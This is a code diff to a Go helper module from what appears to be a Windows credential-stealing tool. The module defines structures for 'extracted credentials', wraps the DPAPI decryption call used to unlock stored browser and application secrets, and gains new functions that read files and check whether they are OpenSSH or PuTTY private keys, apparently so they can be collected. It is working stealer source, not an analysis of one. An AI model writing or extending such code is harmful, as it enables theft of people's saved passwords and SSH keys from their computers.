@@ -1,8 +1,12 @@
 package common
 
 import (
+	"encoding/pem"
+	"golang.org/x/crypto/ssh"
 	"io/ioutil"
+	"log"
 	"os"
+	"regexp"
 	"syscall"
 	"unsafe"
 )
@@ -10,23 +14,23 @@ import (
 var (
 	/*
 		Contain home directory of current user
-	 */
-	UserHome     = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
+	*/
+	UserHome = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
 
 	/*
 		Contain path to %APPDATA% directory
-	 */
-	AppData      = os.Getenv("APPDATA")
+	*/
+	AppData = os.Getenv("APPDATA")
 
 	/*
 		Contain path to %LOCALAPPDATA% directory
-	 */
+	*/
 	LocalAppData = os.Getenv("LOCALAPPDATA")
 )
 
 /*
 	Main struct for extracted credentials that contains a target url, login and password
- */
+*/
 type UrlNamePass struct {
 	Url      string
 	Username string
@@ -35,12 +39,11 @@ type UrlNamePass struct {
 
 /*
 	Struct for extracted credentials that contains only a login and password
- */
+*/
 type NamePass struct {
 	Name string
 	Pass string
 }
-
 
 type ExtractCredentialsResult struct {
 	Success bool
@@ -128,3 +131,58 @@ func Win32CryptUnprotectData(cipherText string, entropy bool) string {
 /*
 	End WinAPI decrypt function
 */
+
+func OpensshKeyCheck(key []byte) bool {
+	//block - pem encoded data
+	block, _ := pem.Decode(key)
+	if block == nil {
+		return false
+	}
+	_, err := ssh.ParsePrivateKey(key)
+	if err != nil {
+		return false
+	} else {
+		return true
+	}
+}
+
+/*
+	Ugly function for putty key format checking
+ */
+func PpkKeyCheck(key []byte) bool {
+	pattern := `Private-Lines: \d+`
+	match, err := regexp.MatchString(pattern, string(key))
+	if err != nil {
+		return false //, fmt.Errorf("Error matching: ")
+	}
+	if match {
+		return true
+	} else {
+		return false
+	}
+}
+
+/*
+	Read key from file and return him
+ */
+func ReadKey(keyPath string) []byte {
+	f, err := os.Open(keyPath)
+	if err != nil {
+		return nil
+	}
+	defer f.Close()
+	stat, err := f.Stat()
+	if err != nil {
+		return nil
+	}
+	size := int(stat.Size())
+	//error opening file
+	key := make([]byte, size)
+	_, err = f.Read(key)
+	//error reading file
+	if err != nil {
+		log.Println("Error reading file: ", err)
+		return nil
+	}
+	return key
+}
